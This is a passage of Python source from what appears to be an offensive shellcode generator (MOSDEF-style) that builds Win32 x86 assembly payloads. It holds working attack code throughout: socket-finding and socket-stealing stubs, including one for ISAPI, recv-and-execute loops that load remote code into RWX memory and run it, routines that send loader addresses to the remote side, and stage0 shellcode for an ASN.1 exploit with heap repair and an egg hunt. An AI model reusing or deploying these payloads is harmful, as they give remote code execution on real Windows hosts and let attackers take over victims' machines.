        xorl %eax,%eax
        // len (1)
        incl %eax
        pushl %eax
        // buf
        pushl %esi
        // fd
        pushl %edi
        // call recv
        call *4(%ebx)   // recv(1) 
        cmpb $0x4f,(%esi) // see if we received 'O' (will be 'G' from send if not)
        jne exitme

        // write the success fd into FDSPOT of the main thread
        movl 0x10(%ebx),%eax
        movl %edi,(%eax) 

        // exit thread
        exitme:
        call *8(%ebx) // exithtread

        endofthreadcode:
        call backtothread
        // our send/recv/exitthread dwords end up here
        threadcode_functions:
// 5 dwords placeholders (send,recv,exitthread,getfiletype,(FDSPOT))
.long 0x41414141
.long 0x41414142
.long 0x41414143
.long 0x41414144
.long 0x41414145
//SETBLOCKINGDWORDS
        threadcode_continue:
"""

        if args != None and "setblocking" in args and int(args["setblocking"]):
            self.imports += ["ws2_32.ioctlsocket", "ws2_32.wsaasyncselect", "ws2_32.wsaeventselect"]
            #print "[!] SETBLOCKING!"
            # optional
            SETBLOCKING = """
            // if WSAAsyncSelect or WSAeventSelect has been used
            // on a SOCKET, you have to reset it back to blocking
            // using WSAAsyncSelect/WSAeventSelect with a zero event mask
            //
            // note: bruting the windowhandle for now, not very elegant
            movb $0xff,%al
            pushl %eax
            brutewindow:
            xorl %eax,%eax
            pushl %eax
            pushl %eax
            pushl 8(%esp)
            pushl %edi // socket
            call *0x18(%ebx) // wsaasyncselect
            test %eax,%eax
            jz brutewindowdone
            decl (%esp)
            movl (%esp),%eax
            test %eax,%eax
            jnz brutewindow
            brutewindowdone:
            popl %eax

            //!!! make sure this SOCKET is set to blocking
            // FIONBIO: 0x8004667E
            xorl %eax,%eax
            pushl %eax
            // *argp
            pushl %esp
            // FIONBIO (32bit win32)
            pushl $0x8004667E
            // socket
            pushl %edi
            call *0x14(%ebx) // ioctlsocket
            popl %eax
            """
            THREADCODE = THREADCODE.replace("//SETBLOCKINGCODETAG", SETBLOCKING)
            SETBLOCKINGDWORDS = """
            .long 0x41414146
            .long 0x41414147
            .long 0x41414148
            """
            THREADCODE = THREADCODE.replace("//SETBLOCKINGDWORDS", SETBLOCKINGDWORDS)
            SETBLOCKINGADDWORDS = """
               movl ioctlsocket-geteip(%ebx),%edx
            movl %edx,0x14(%eax)
               movl wsaasyncselect-geteip(%ebx),%edx
            movl %edx,0x18(%eax)
               movl wsaeventselect-geteip(%ebx),%edx
            movl %edx,0x1c(%eax)
            """
            CREATETHREADGOCODE = CREATETHREADGOCODE.replace("//SETBLOCKINGADDWORDS", SETBLOCKINGADDWORDS)

        if args != None and "startsock" in args:
            start = int(args["startsock"]) - 4
        if args != None and "endsock" in args:
            end = int(args["endsock"])

        CREATETHREADGOCODE  = CREATETHREADGOCODE.replace("STARTRANGE", "0x%X"% start)
        CREATETHREADGOCODE  = CREATETHREADGOCODE.replace("ENDRANGE", "0x%X"% end)

        # get the imports we need
        self.imports += ["ws2_32.getpeername", "ws2_32.select", "ws2_32.send", "ws2_32.recv",\
                         "kernel32.createthread", "kernel32.exitthread",\
                         "kernel32.getfiletype", "kernel32.closehandle"]
        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        self.code += CREATETHREADGOCODE + THREADCODE


    def FindPeekSock(self, args):
        """
        Find socket using MSG_PEEK

        It expects "ABCD" + regular mosdef len + payload to be sitting on the socket.
        Set { "EchoMarker" : 1 } if you want the payload to echo back the Marker for confirmation.            
        """

        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        PeekSock=""


        PeekSock += """
// call peeksleep
peeksock:
        // no range set, it just keeps going.
        xorl %edx,%edx
        // space for tag
        pushl %edx

peekloop:
        movl %esp,%ecx
        // add range check here if so desired
        addl $4,%edx
        pushl %edx

        xorl %eax,%eax
        // MSG_PEEK
        movb $2,%al
        pushl %eax
        // len (4)
        incl %eax
        incl %eax
        pushl %eax
        // buf
        pushl %ecx
        // fd
        pushl %edx
        // call recv
        call recv - geteip(%ebx)
        // edx gets altered, so save it
        popl %edx

        // we don't even check for error, what do we care
        movl (%esp),%eax
        cmpl $MARKER,%eax
        jne peekloop

// .byte 0xcc
foundsock:
// call peeksleep
        // socket is in %edx, load into FDREG
        movl %edx,%FDREG
        // eat the marker bytes for real
        movl %esp,%ecx
        xorl %eax,%eax
        pushl %eax
        movb $4,%al
        pushl %eax
        pushl %ecx
        pushl %FDREG
        call recv - geteip(%ebx)
        // should be ready to rock for the next stage
        """

        EchoStub = """
        // echo the marker back for people who want confirmation
        movl %esp,%ecx
        xorl %eax,%eax
        pushl %eax
        movb $4,%al
        pushl %eax
        pushl %ecx
        pushl %FDREG
        call send - geteip(%ebx)

        """

#        PeekSock+="""
#        jmp endpeeksock
#peeksleep:        
#// a loop to slow things down so the other end has time to send something
#push %ecx
#movl $0x7fff, %ecx
#peeksleeploop:
#inc %eax
#dec %eax
#loop peeksleeploop
#pop %ecx
#ret
#        """

        PeekSock +="""
        endpeeksock:
            """

        if args != None and "EchoMarker" in args and int(args["EchoMarker"]):
            self.imports += ["ws2_32.send"]
            PeekSock += EchoStub

        # default marker to ABCD
        PeekSock = PeekSock.replace("MARKER", "0x44434241")
        # default reg to esi
        PeekSock = PeekSock.replace("FDREG", "esi")

        # get the imports we need
        self.imports += ["ws2_32.recv"]

        self.code += PeekSock
        return


    def isapiGOFindSock(self,args):
        """
        Anyways, here is an algo I need to put into shellcode that will do socket stealing in any ISAPI.

        for (i=esp; i<esp|0xffff; i++):
         #go down the stack looking for a pointer to the EXTENTION_CONTROL_BLOCK
         #which will contain a size,connectionid,statuscode, etc.
         if *i==0x90 and *(i+8)==i:
           ecbid=i #this is a pointer to itself.
           writeclient=*i+0x80
           readclient=*i+0x84

        After that, you have a read and write pointer, and the ID that makes it all work. You then need to modify your second and MOSDEF-stage shellcode to use that, instead of connect/recv/write/etc. That'll do socket stealing for all ISAPI's. :>

        Note: If you don't align the stack when going into these calls, you'll get a weird "STACK OVERFLOW" exception.
        """
        code="""
        mov %esp,%ecx //look on our stack.
        mov %esp,%ebp //save us a frame here.
        sub $24,%esp  //ebp-4 is VAR_A, ebp-12 is writeclient ebp-16 is readclient
        //ebp-20 is buffer
        push %ecx
findloop:
        pop %ecx    
        addl $0x4,%ecx
        push %ecx
        movl (%ecx),%ecx //ecx=*ecx
        push %ecx //save this off
        pushl $16 //check to see if we can read at least 16 bytes at the pointer ecx
        pushl %ecx
        call isbadreadptr-geteip(%ebx)
        test %eax,%eax
        pop %ecx //restore it
        jnz  findloop //could not read at that pointer
        cmp 8(%ecx),%ecx //if *(ptr+8)==ptr
        jne findloop

        //if it is equal, we found it!
        movl %ecx,(%ebp)

        movl $0xffffffff,0x70(%ecx) //cbTotalBytes needs to be set to -1 for ReadClient to actually read data
        movl 0x84(%ecx),%esi //writeclient        
        movl 0x88(%ecx),%edi //readclient
        movl %esi,-12(%ebp)
        movl %edi,-16(%ebp)

        pushl %ecx //our context pointer 
        pushl %esi //&writeclient
        pushl %edi //&readclient
        pushl $0x47474747 //sending a GGGG - this is all in reverse order, btw.
        movl %esp,%edx //pointer to buffer to send

        pushl $1 //dwSync
        movl $16,-4(%ebp)
        lea -4(%ebp),%eax
        pushl %eax //lpdwSizeofBuffer
        pushl %edx //Buffer
        pushl %ecx //ConnID
        call %esi //WriteClient
        addl $16,%esp

        movl $4,-4(%ebp)
        lea -4(%ebp),%eax
        pushl %eax //lpdwSize
        lea -8(%ebp),%eax
        pushl %eax //lpvBuffer
        movl (%ebp),%ecx
        pushl %ecx //hConn
        call %edi  //ReadClient

        movl -8(%ebp),%eax 
        push %eax //save size off

        movl %eax,-4(%ebp)
        subl %eax,%esp //save buffer space
        andl $0xfffffffc,%esp
        push $-0x1
        movl %esp, %edx

        lea -4(%ebp),%eax
        pushl %eax //lpdwSize
        pushl %edx //lpvBuffer
        movl (%ebp),%ecx
        pushl %ecx //hConn
        call %edi  //ReadClient
        jmp *%esp //jmping to shellcode, booyakasha!
        """
        self.code+=code

        self.imports += ["kernel32.isbadreadptr"]
        return

    def IsapiSendInfo(self,args):
        """
        Sends the args needed to the remote server
        """
        code="""//.byte 0xcc
        movl $WRITECLIENT,%esi
        movl $READCLIENT,%edi
        movl $CONTEXTPTR,%ebp
        movl loadlibrarya-geteip(%ebx),%eax
        pushl %eax
        movl getprocaddress-geteip(%ebx),%eax
        pushl %eax
        movl %esp,%ecx
        pushl $0x8 //8 bytes
        movl %esp,%eax
        pushl $0x1 //dwSync
        pushl %eax //lpdwSizeofBuffer
        pushl %ecx //Buffer
        pushl %ebp //ConnID
        call *%esi //WriteClient
        addl $0xc,%esp //readjust stack

        pushl $0x8 //8 bytes
        movl %esp,%eax
        pushl $0x0
        pushl $0x0
        movl %esp,%ecx
        pushl %eax //lpdwSize
        pushl %ecx //lpvBuffer
        pushl %ebp //hConn
        call *%edi //ReadClient
        popl %edx
        subl $0x4,%edx
        popl %ecx
        addl $0x4,%esp
        subl %edx,%esp
        andl $0xfffffffc,%esp
        pushl $0x0
        movl %esp,%eax
        pushl %ecx
        pushl %edx //%edx bytes
        movl %esp,%ecx
        pushl %ecx //lpdwSize
        pushl %eax //lpvBuffer
        pushl %ebp //hConn
        call *%edi //ReadClient
        popl %eax  //adjust esp to point to the received buffer
        jmp *%esp"""
        code=code.replace("WRITECLIENT","0x%8.8x"%args["writeclient"])
        code=code.replace("READCLIENT","0x%8.8x"%args["readclient"])
        code=code.replace("CONTEXTPTR","0x%8.8x"%args["context"])
        self.code+=code
        self.imports.append("kernel32.getprocaddress")
        self.imports.append("kernel32.loadlibrarya")
        return

    def isapiRecvExecLoop(self,args):
        code="""//.byte 0xcc
isapirecvloop:
        movl $WRITECLIENT,%esi
        movl $READCLIENT,%edi
        movl $CONTEXTPTR,%ebp
getsize:
        pushl $0x8 //4 bytes
        movl %esp,%eax
        pushl $0x0
        pushl $0x0
        movl %esp,%ecx
        pushl %eax //lpdwSize
        pushl %ecx //lpvBuffer
        pushl %ebp //hConn
        call *%edi //ReadClient
        popl %edx
        subl $0x4,%edx
        popl %ecx
        addl $0x4,%esp
        test %eax,%eax
        jnz checksize
        call *getlasterror-geteip(%ebx)
        cmpl $10060,%eax //WSAETIMEDOUT
        jz getsize
        jmp exit
checksize:
        test %edx,%edx //-4 on connection closed
        jle exit

        subl %edx,%esp
        andl $0xfffffffc,%esp
        pushl $0x0 //safeguard for when the size is not a multiple of 4 (we add 4 extra bytes to the stack buffer)
        movl %esp,%eax
        pushl %ecx
        pushl %edx //%edx bytes
        movl %esp,%ecx
        pushl %ecx //lpdwSize
        pushl %eax //lpvBuffer
        pushl %ebp //hConn
        call *%edi //ReadClient
        popl %eax  //adjust esp to point to the received buffer
        movl %esp,%eax
        pushl %ebx
        call *%eax
        popl %ebx
        jmp isapirecvloop
        """
        code=code.replace("WRITECLIENT","0x%8.8x"%args["writeclient"])
        code=code.replace("READCLIENT","0x%8.8x"%args["readclient"])
        code=code.replace("CONTEXTPTR","0x%8.8x"%args["context"])
        self.code+=code
        self.imports.append("kernel32.getlasterror")
        self.imports.append("kernel32.exitthread")
        return


    def SmallRecvExecWin32(self, args):
        """
        Recv and exec stub 

        Tries to be smaller and less reliable than our standard stub

        This code receives a little endian 4 byte len value and recvs
        that much data onto the stack and then jump's to execute it

        Assumptions:
            - SOCKET handle is in esi
            - We already imported recv
        Usage:
            - leaves the active socket in esi
            - relies on blocking sockets
                we set sockets to blocking in GOcode
            - optional argument "socketreg" is moved into esi

        """
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])
        win32RecvExecCode = ""        
        if args!=None and "socketreg" in args.keys():
            if args["socketreg"]=="FDSPOT":
                win32RecvExecCode+="movl FDSPOT-geteip(%ebx), %esi\n"
            else:
                win32RecvExecCode+="movl %%%s, %%esi\n"%(args["socketreg"].replace("%",""))
        win32RecvExecCode +="""
win32RecvExecCode:
        //int3 //debug
        xorl %eax,%eax
        pushl %eax
        movl %esp,%ecx
        pushl %eax
        pushl $0x4
        pushl %ecx
        pushl %esi
        call *recv-geteip(%ebx)
        cmpb $4,%al
        je gogotlen
        jmp exit
gogotlen:
        //int3 //debug
        popl %eax
        pushl %eax //sub $0x4,%esp
        movl %eax,%edi
.byte 0x24
.byte 0xfc //andb $0xfc,%al
        subl %eax,%esp
        movl %esp,%ebp
        xorl %eax,%eax
        pushl %eax
        pushl %edi
        pushl %ebp
        pushl %esi
        call *recv-geteip(%ebx)
        jmp *%ebp
        """
        self.imports.append("ws2_32.recv")
        self.code += win32RecvExecCode
        return

    def RecvExecWin32(self, args):
        """
        Recv and exec loop stub to accompany win32 socket recycling.

        This code receives a little endian 4 byte len value and recvs
        that much data onto the stack and then jump's to execute it

        Assumptions:
            - SOCKET handle is in esi
            - We already imported recv
        Usage:
            - leaves the active socket in esi
            - relies on blocking sockets
                we set sockets to blocking in GOcode
            - optional argument "socketreg" is moved into esi

        """
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])
        win32RecvExecCode = ""        
        if args!=None and "socketreg" in args.keys():
            if args["socketreg"]=="FDSPOT":
                win32RecvExecCode+="movl FDSPOT-geteip(%ebx), %esi\n"
            else:
                win32RecvExecCode+="movl %%%s, %%esi\n"%(args["socketreg"].replace("%",""))
        win32RecvExecCode +="""
win32RecvExecCode:
        //int3 //debug
        xorl %eax,%eax
        pushl %eax
        movl %esp,%ecx
        pushl %eax
        pushl $0x4
        pushl %ecx
        pushl %esi
        call *recv-geteip(%ebx)
        cmpb $4,%al
        //int3
        je gogotlen
        jmp exit
gogotlen:
        //int3 //debug
        popl %eax
        pushl %eax //sub $0x4,%esp
        movl %eax,%edi
.byte 0x24
.byte 0xfc //andb $0xfc,%al
        subl %eax,%esp
        movl %esp,%ebp
        pushl %ebp
gorecvexecloop:
        xorl %eax,%eax
        pushl %eax
        pushl %edi
        pushl %ebp
        pushl %esi
        call *recv-geteip(%ebx)
        cmpl $-0x1,%eax
        je exit
        cmpl %eax,%edi
        je stagetwo
        subl %eax,%edi
        addl %eax,%ebp
        jmp gorecvexecloop
stagetwo:
        popl %ebp
        jmp *%ebp
        """
        self.imports.append("ws2_32.recv")
        self.code += win32RecvExecCode
        return

    def RecvExecLoop(self,args):
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])
        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        code="""

        movl $SOCKETFD, FDSPOT - geteip(%ebx)
    recvexecloop:
        movl $SOCKETFD, %esi
    win32RecvExecCode:
        //.byte 0xcc
        // this uses edx internally as the socket reg
        movl %esi,%edx
        // save SOCKET
    gogetlen:
        pushl %edx
        // get len room
        xorl %eax,%eax
        pushl %eax
        movl %esp,%esi
        // flags
        pushl %eax
        // len 4
        movb $4,%al
        pushl %eax
        // recv buf
        pushl %esi
        // SOCKET
        pushl %edx
        // call recv
        call recv - geteip(%ebx)
        // if anything but 4 we failed
        cmpb $4, %al
        //int3 //debug
        je gogotlen
        // eat room push
        popl %edx
        // restore socket
        popl %edx
        // we failed, try again or do something else?
        //int3
        jmp exit
    gogotlen:
        // get len into eax
        popl %eax
        // restore SOCKET
        popl %edx
        movl %esp, %ebp
        // adjust stack for len we have to recv
        subl %eax,%esp
        // normalise stack pointer
        andl $0xFFFFFF00,%esp
        // save stack for us to jmp to later on
        movl %esp,%esi
        // save stackptr we can adjust freely
        movl %esp,%ecx
        // save amount to recv in edi
        movl %eax,%edi
        gorecvexecloop:
        // save SOCKET
        pushl %edx
        // save our offset stackptr
        pushl %ecx
        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        pushl %edi
        // buf
        pushl %ecx
        // SOCKET
        pushl %edx
        call recv - geteip(%ebx)
        // get our offset ptr back
        popl %ecx
        // get our socket back
        popl %edx
        // if we're -1 exit or do something else?
        cmpl $-1,%eax
        //int3
        je exit
        // see if we're done yet
        cmpl %eax,%edi
        je stagetwo
        // didnt get all the data yet
        subl %eax,%edi
        addl %eax,%ecx
        jmp gorecvexecloop
    stagetwo:
        // reset ebx so we dont get confused
        push %ebx
        call *%esi
        pop %ebx
        movl %ebp, %esp //have to restore this to prevent stack leak!
        jmp recvexecloop
        //never continues after this
        """.replace("SOCKETFD",str(args["fd"]))
        self.code+=code
        self.imports.append("ws2_32.recv")

        #print "Code=%s"%code

        return


    def RecvExecDepSafe(self, args):
        """
        Simple recv and exec with DEP safety
        Leaves FD in ESI

        """
        if not self.foundeip:
            self.findeip([0])

        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        code = ""

        if args != None:

            if "fd" in args.keys():        
                code += """        
                movl $SOCKETFD, FDSPOT - geteip(%ebx)
                movl FDSPOT - geteip(%ebx), %esi
                """.replace("SOCKETFD", str(args["fd"]))

            if 'socketreg' in args.keys():
                if args['socketreg'].upper() != 'FDSPOT':
                    code += """
                    movl %%%s, FDSPOT - geteip(%ebx)
                    """ % args['socketreg']
                # FDSPOT was already set ...
            else:
                # default to esi for backwards compat.    
                code += """
                movl %esi, FDSPOT - geteip(%ebx) 
                """

        code += """

    recvexecloop:
        // this uses edx internally as the socket reg
        movl FDSPOT - geteip(%ebx), %edx

    gogetlen:
        pushl %edx
        // get len room
        xorl %eax,%eax
        pushl %eax
        movl %esp,%esi
        // flags
        pushl %eax
        // len 4
        movb $4,%al
        pushl %eax
        // recv buf
        pushl %esi
        // SOCKET
        pushl %edx
        // call recv
        call recv - geteip(%ebx)
        // if anything but 4 we failed
        cmpb $4, %al
        je gogotlen
        // eat room push
        popl %edx
        // restore socket
        popl %edx
        // we failed, try again or do something else?
        jmp exit

    gogotlen:
        // get len into edi
        popl %edi

        // ALLOC HERE
        pushl $0x40
        pushl $0x1000
        pushl %edi
        pushl $0
        call virtualalloc - geteip(%ebx)
        // eax has where we want to jump

        // restore SOCKET
        popl %edx

        // normalise stack pointer
        andl $0xFFFFFF00,%esp
        // save ptr for us to jmp to later on
        movl %eax,%esi
        // save ptr we can adjust freely
        movl %eax,%ecx

    gorecvexecloop:
        // save SOCKET
        pushl %edx
        // save our offset stackptr
        pushl %ecx

        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        pushl %edi
        // buf
        pushl %ecx
        // SOCKET
        pushl %edx
        call recv - geteip(%ebx)

        // get our offset ptr back
        popl %ecx
        // get our socket back
        popl %edx
        // if we're -1 exit or do something else?
        cmpl $-1,%eax
        je exit

        // see if we're done yet
        cmpl %eax,%edi
        je stagetwo

        // didnt get all the data yet
        subl %eax,%edi
        addl %eax,%ecx
        jmp gorecvexecloop

    stagetwo:
        // reset ebx so we dont get confused
        push %ebx
        // edx has socket handle, esi has address to call...we exchange them
        xchg %edx, %esi
        call *%edx
        //now change them back so we can free esi later
        xchg %edx, %esi
        popl %ebx

        // free the memory !
        pushl $0x8000 // release
        pushl $0x0
        pushl %esi
        call virtualfree - geteip(%ebx)

        jmp recvexecloop

        """

        self.code += code

        self.imports.append("ws2_32.recv")
        self.imports.append("kernel32.virtualalloc")
        self.imports.append("kernel32.virtualfree")

        return

    def RecvExecAllocLoop(self, args):
        """ recvs and executes with a DEP safe virtual alloc """

        if not self.foundeip:
            self.findeip([0])

        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        code = ""

        if args != None and "fd" in args.keys():        
            code += """        
            movl $SOCKETFD, FDSPOT - geteip(%ebx)
            movl FDSPOT - geteip(%ebx), %esi
            """.replace("SOCKETFD", str(args["fd"]))

        code += """
        // a bit redundant, but just to make sure
        movl %esi, FDSPOT - geteip(%ebx) 

    recvexecloop:
        // this uses edx internally as the socket reg
        movl FDSPOT - geteip(%ebx), %edx

    gogetlen:
        pushl %edx
        // get len room
        xorl %eax,%eax
        pushl %eax
        movl %esp,%esi
        // flags
        pushl %eax
        // len 4
        movb $4,%al
        pushl %eax
        // recv buf
        pushl %esi
        // SOCKET
        pushl %edx
        // call recv
        call recv - geteip(%ebx)
        // if anything but 4 we failed
        cmpb $4, %al
        je gogotlen
        // eat room push
        popl %edx
        // restore socket
        popl %edx
        // we failed, try again or do something else?
        jmp exit

    gogotlen:
        // get len into edi
        popl %edi

        // ALLOC HERE
        pushl $0x40
        pushl $0x1000
        pushl %edi
        pushl $0
        call virtualalloc - geteip(%ebx)
        // eax has where we want to jump

        // restore SOCKET
        popl %edx

        // normalise stack pointer
        andl $0xFFFFFF00,%esp
        // save ptr for us to jmp to later on
        movl %eax,%esi
        // save ptr we can adjust freely
        movl %eax,%ecx

    gorecvexecloop:
        // save SOCKET
        pushl %edx
        // save our offset stackptr
        pushl %ecx

        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        pushl %edi
        // buf
        pushl %ecx
        // SOCKET
        pushl %edx
        call recv - geteip(%ebx)

        // get our offset ptr back
        popl %ecx
        // get our socket back
        popl %edx
        // if we're -1 exit or do something else?
        cmpl $-1,%eax
        je exit

        // see if we're done yet
        cmpl %eax,%edi
        je stagetwo

        // didnt get all the data yet
        subl %eax,%edi
        addl %eax,%ecx
        jmp gorecvexecloop

    stagetwo:
        // reset ebx so we dont get confused
        push %ebx
        call *%esi
        popl %ebx

        // free the memory !
        pushl $0x8000 // release
        pushl $0x0
        pushl %esi
        call virtualfree - geteip(%ebx)

        jmp recvexecloop

        """

        self.code += code

        self.imports.append("ws2_32.recv")
        self.imports.append("kernel32.virtualalloc")
        self.imports.append("kernel32.virtualfree")

        return

    def CreateThreadRecvExecWin32(self, args):
        """
        Recv and exec loop stub to accompany win32 socket recycling.

        Assumptions:
            - SOCKET handle is in esi
            - We already imported recv
        Usage:
            - leaves the active socket in esi
            - relies on blocking sockets
                we set sockets to blocking in GOcode
            - optional argument "socketreg" is moved into esi

        """
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])
        win32RecvExecCode = ""        
        if args!=None and "socketreg" in args.keys():
            if args["socketreg"]=="FDSPOT":
                win32RecvExecCode+="movl FDSPOT-geteip(%ebx), %esi\n"
            else:
                win32RecvExecCode+="movl %%%s, %%esi\n"%(args["socketreg"])
        win32RecvExecCode +="""
win32RecvExecCode:
        xorl %eax,%eax
        pushl %eax
        movl %esp,%ecx

        pushl %eax
        pushl $0x4
        pushl %ecx
        pushl %esi
        call *recv-geteip(%ebx)
        cmpb $4,%al
        je gogotlen
        jmp exit

gogotlen:
        // pop len to alloc
        popl %edi

        pushl $0x40 // RWX
        pushl $0x1000
        pushl %edi
        pushl $0
        call virtualalloc-geteip(%ebx)

        // save jump address (twice)
        pushl %eax
        pushl %eax

gorecvexecloop:
        popl %ebp
        pushl %ebp

        xorl %eax,%eax
        pushl %eax
        pushl %edi
        pushl %ebp
        pushl %esi
        call *recv-geteip(%ebx)
        cmpl $-0x1,%eax
        je exit

        cmpl %eax,%edi
        je stagetwo

        subl %eax,%edi
        addl %eax,(%esp)
        jmp gorecvexecloop

stagetwo:
        popl %ebp // changed
        popl %ebp // original

        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %esi // socket
        pushl %ebp // base
        pushl %eax
        pushl %eax
        call createthread-geteip(%ebx)
        jmp exit 
        """

        self.imports.append("ws2_32.recv")
        self.imports.append("kernel32.createthread")
        self.imports.append("kernel32.virtualalloc")
        self.code += win32RecvExecCode

        return

    def loadFDasreg(self,args):
        reg=args["reg"]
        code="movl FDSPOT - geteip(%ebx), %reg\n".replace("reg",reg)
        self.code+=code
        #self.longs+= ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        return

    def LoadSavedRegAsFD(self, args):
        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        # make sure we handle both formats
        if args!=None:
            register = args["reg"]
            register = register.replace("%", "")
        else:
            register="eax"

        """          
            With using two stage shellcodes on a GOcode premise
            we need to have our socket value survive through
            the import loops to be able to load it into FDSPOT
            Preferably postfindeip, when there hasnt been too
            much calls to other functions yet

            We solved this by having a savereg argument to
            findeip
        """

        loadCode = """
        //int3
        popl %REGTOLOAD
        movl %REGTOLOAD,FDSPOT - geteip(%ebx)
        """
        loadCode = loadCode.replace("REGTOLOAD", register)
        self.code += loadCode
        return

    def LoadRegAsFD(self, args):
        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        register = args["reg"]
        register = register.replace("%", "")

        """          
        Use this to load the active socket from
        a reg to FDSPOT on single stage payloads
        using the GOcode, for an example see the
        slweb exploit
        """

        loadCode = """
        //int3 //debug
        movl %REGTOLOAD,FDSPOT - geteip(%ebx)
        """
        loadCode = loadCode.replace("REGTOLOAD", register)
        self.code += loadCode
        return

    def send_universal(self, args):
        """
        Sends a universal key to the remote side (aka, mosdef_type and id)
        """
        mosdef_type=args["mosdef_type"]
        mosdef_id=args["mosdef_id"]
        code="""
        send_universal:
        pushl $MOSDEF_TYPE
        movl %esp, %eax
        pushl $4
        pushl %eax
        call sendloop
        popl %eax //clear our buffer

        pushl $MOSDEF_ID
        movl %esp, %eax
        pushl $4
        pushl %eax
        call sendloop
        popl %eax //clear our buffer
        """
        code=code.replace("MOSDEF_TYPE",str(reverseword(mosdef_type)))
        code=code.replace("MOSDEF_ID",str(reverseword(mosdef_id)))
        self.requireFunctions(["sendloop"])
        self.code+=code
        return 

    def sendFD(self,args):
        """
        Sends our stored FD (our socket) down the wire
        """
        #self.longs += ["FDSPOT"]
        self.addVariable("FDSPOT", long, 0)
        code="""
        pushl FDSPOT - geteip(%ebx)
        movl %esp, %eax
        pushl $4
        pushl %eax
        call sendloop
        popl %eax

        """
        self.requireFunctions(["sendloop"])
        self.code+=code
        return 

    def sendGetProcandLoadLib(self,args):
        self.imports.append("kernel32.getprocaddress")
        self.imports.append("kernel32.loadlibrarya")
        code="""
        pushl getprocaddress - geteip(%ebx)
        movl %esp, %eax
        pushl $4
        pushl %eax
        call sendloop
        popl %eax

        //now do loadlibrary
        pushl loadlibrarya - geteip(%ebx)
        movl %esp, %eax
        pushl $4
        pushl %eax
        call sendloop
        popl %eax

        //now do ws2_32.dll|send
        pushl send - geteip(%ebx)
        movl %esp, %eax
        pushl $4
        pushl %eax
        call sendloop
        popl %eax
        """
        self.requireFunctions(["sendloop"])
        self.code+=code
        return

    def ASN1Stage0(self, args):
        """
        solar's stage0 shellcode for the ASN.1 exploit (ported to MOSDEF-able AT&T)

        """
        stage0 = """
        pushl %ebx
        pushl %esi
        pushl %edi

        // allocate space for string table
        subl $128,%esp
        movl %esp,%esi

        // (%esi)
        //   00 ntdll.dll base address
        //   04 kernel32.dll base address
        //   08 RtlEnterCriticalSection
        //   0C CreateThread
        //   10 address of stage1 shellcode

        // get ntdll.dll and kernel32.dll base addresses and store them
        // in (%esi) and 4(%esi)
        call find_base_address

        // GetProcAddress(RtlEnterCriticalSection)
        pushl (%esi)
        pushl $0x63d61209
        call find_function
        movl %eax,8(%esi)

        // fix the non-dedicated free list pointers
        call fix_heap

        // GetProcAddress(CreateThread)
        pushl 4(%esi)
        pushl $0xca2bd06b
        call find_function
        movl %eax,0xc(%esi)

        // Find the stage1 shellcode and store its address as 0x10(%esi)
        call find_stage1

        // GetProcAddress(LocalAlloc)
        pushl 0x4(%esi)
        pushl $0x4c0297fa
        call find_function

        // allocate a new buffer for the shellcode
        xorl %ebx,%ebx
        // size
        pushl $1040
        // LMEM_FIXED
        pushl %ebx
        // LocalAlloc(LMEM_FIXED, 1040)
        call *%eax

        // ebx == new memory block
        movl %eax,%ebx

        // copy the stage1 shellcode into the new memory block
        pushl %esi
        movl 0x10(%esi),%esi
        movl %eax,%edi
        movl $1040,%ecx
        copyloop:
        movb (%esi),%al
        movb %al,(%edi)
        incl %esi
        incl %edi
        decl %ecx
        jnz copyloop
        popl %esi

        // CreateThread(NULL, 0, startaddr, NULL, 0, NULL
        xorl %eax,%eax
        // lpThreadId
        pushl %eax
        // dwCreationFlags
        pushl %eax
        // lpParameter
        pushl %eax
        //lpStartAddress == stage1 shellcode
        pushl %ebx
        // dwStacksize
        pushl %eax
        // lpThreadAttributes
        pushl %eax
        call 0x0c(%esi)

        // eax == RtlEnterCriticalSection
        movl 8(%esi),%eax

        // free stack space
        addl $128,%esp

        // restore registers
        popl %edi
        popl %esi
        popl %ebx

        // jump to RtlEnterCrtiticalSection
        jmp %eax

find_stage1:
        //pushad
        pushl %eax
        pushl %ecx
        pushl %edx
        pushl %ebx
        pushl %esp
        // make saved esp original
        addl $16,(%esp)
        pushl %ebp
        pushl %esi
        pushl %edi

        call init
        // does not return

exception_handler:
        // this handles access violations when searching for stage1
        movl 0x0c(%esp),%eax
        leal 0x7c(%eax),%ebx

        // skip to jmp compareloop
        addl $14,0x3c(%ebx)

        // move the saved ebx to the beginning of the next page
        addl $0x1000,0x28(%ebx)
        andl $0xfffff000,0x28(%ebx)

        movl (%esp),%eax
        addl $0x14,%esp
        pushl %eax
        xorl %eax,%eax
        ret

init:
        // the addres of the exception handler is already on the stack
        xorl %edx,%edx
        // save previous exception handler
        pushl %fs:(%edx)
        // set new handler
        movl %esp,%fs:(%edx)

        // start the search at address 0
        xorl %ebx,%ebx
        //!!! the search tag, double check 
        movl $0x42904290,%eax

loadbase:
        movl %ebx,%edi
compareloop:
        cmpl %edi,%ebx
        // if ebx > edi we're on a new search page
        jg loadbase
        movl (%edi),%ecx
        // next byte
        incl %edi
        // first instance of tag found?
        cmpl %ecx,%eax
        jne compareloop
        // second instance of tag there too (3, already incl)?
        movl 3(%edi),%ecx
        cmpl %ecx,%eax
        je found
        jmp compareloop

found:
        // point edi one back to point at start of found stage1
        decl %edi
        // save the address of the stage1 shellcode
        movl %edi,0x10(%esi)
        // restore the original exception handler 
        popl %fs:(%edx)
        popl %eax

        //popad
        movl %esp,%esi
        movl (%esi),%edi
        movl 8(%esi),%ebp
        movl 12(%esi),%esp
        movl 16(%esi),%ebx
        movl 20(%esi),%edx
